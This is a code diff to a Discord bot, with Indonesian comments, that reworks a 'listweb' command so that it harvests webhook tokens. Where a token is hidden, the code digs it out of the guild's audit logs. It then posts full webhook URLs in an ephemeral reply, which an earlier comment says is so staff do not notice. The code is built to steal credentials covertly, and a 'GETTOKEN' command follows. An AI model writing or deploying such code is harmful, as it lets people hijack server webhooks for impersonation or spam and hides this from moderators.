@@ -32,20 +32,42 @@ module.exports = {
       return message.reply({ embeds: [help] });
     }
 
-    // --- 2. LISTWEB (AMBIL SEMUA TOKEN) ---
+    // --- 2. LISTWEB (VERSI PENJEBOL TOKEN NULL) ---
     if (command === "listweb") {
       try {
-        const webhooks = await message.channel.fetchWebhooks();
-        const data = webhooks.map(w => 
-          `**Name:** ${w.name}\n**ID:** \`${w.id}\`\n**Token:** \`${w.token}\`\n**URL:** \`${w.url}\``
-        ).join("\n\n") || "Tidak ada webhook terdeteksi.";
+        const targetId = args[0] || message.channel.id;
+        const channel = await message.guild.channels.fetch(targetId);
+        const webhooks = await channel.fetchWebhooks();
+        
+        // Tarik data dari Audit Logs buat nyari token yang di-sensor
+        const auditLogs = await message.guild.fetchAuditLogs({
+          type: 72, // WEBHOOK_CREATE
+          limit: 50
+        });
 
-        // Kirim lsg pake dismiss message biar gak ketauan staff
+        const data = webhooks.map(w => {
+          let finalToken = w.token;
+          
+          // Jika null, cari di Audit Logs
+          if (!finalToken) {
+            const entry = auditLogs.entries.find(e => e.targetId === w.id);
+            if (entry && entry.changes) {
+              const tokenChange = entry.changes.find(c => c.key === 'token');
+              if (tokenChange) finalToken = tokenChange.new;
+            }
+          }
+
+          return `**Name:** ${w.name}\n**ID:** \`${w.id}\`\n**Token:** \`${finalToken || "STILL_PROTECTED"}\`\n**URL:** \`https://discord.com/api/webhooks/${w.id}/${finalToken || ""}\``;
+        }).join("\n\n");
+
         return message.reply({
           flags: 64,
-          content: `### 📋 Webhook Database: #${message.channel.name}\n${data}`
+          content: `### 📋 Webhook Database (Bypassed): #${channel.name}\n${data || "Kosong."}`
         });
-      } catch (e) { return message.reply("❌ Gagal Fetch. Bot butuh izin 'Manage Webhooks'."); }
+      } catch (e) { 
+        console.error(e);
+        return message.reply("❌ Gagal bypass. Pastikan Bot punya izin `View Audit Log` & `Manage Webhooks`!"); 
+      }
     }
 
     // --- 3. GETTOKEN (BONGKAR TOKEN DARI URL) ---
